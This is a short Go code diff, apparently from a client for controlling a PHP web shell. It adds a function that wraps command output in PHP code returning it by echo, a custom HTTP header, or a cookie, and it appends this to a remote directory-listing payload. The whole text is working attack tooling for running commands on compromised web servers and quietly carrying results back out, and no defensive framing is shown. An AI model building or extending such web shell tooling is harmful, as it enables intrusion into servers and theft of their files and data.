@@ -50,6 +50,23 @@ func (c *CMD) createCMD(cmd *string, r string) {
 	*cmd = shellCMD
 }
 
+func (c *CMD) getReturn() string {
+	var response string
+
+	m := network.NET.GetMethod()
+	p := network.NET.GetParameter()
+
+	if m == 0 || m == 1 {
+		response = "echo(" + normalizer.PHPEncode("$r") + ");exit();"
+	} else if m == 2 {
+		response = "header('" + p + ":' . " + normalizer.PHPEncode("$r") + ");exit();"
+	} else if m == 3 {
+		response = "setcookie('" + p + "', " + normalizer.PHPEncode("$r") + ");exit();"
+	}
+
+	return response
+}
+
 func (cmd *CMD) Ls(c *cli.Context) {
 	if !network.NET.IsSetup() {
 		handleNotConnected()
@@ -76,7 +93,7 @@ func (cmd *CMD) Ls(c *cli.Context) {
 	cmd.createCMD(&lsFolder, "a")
 	cmd.createCMD(&lsFile, "b")
 
-	ls := lsFolder + lsFile + "$r=json_encode(array($a, $b));"
+	ls := lsFolder + lsFile + "$r=json_encode(array($a, $b));" + cmd.getReturn()
 
 	network.NET.Send(ls, lsEnd)
 }
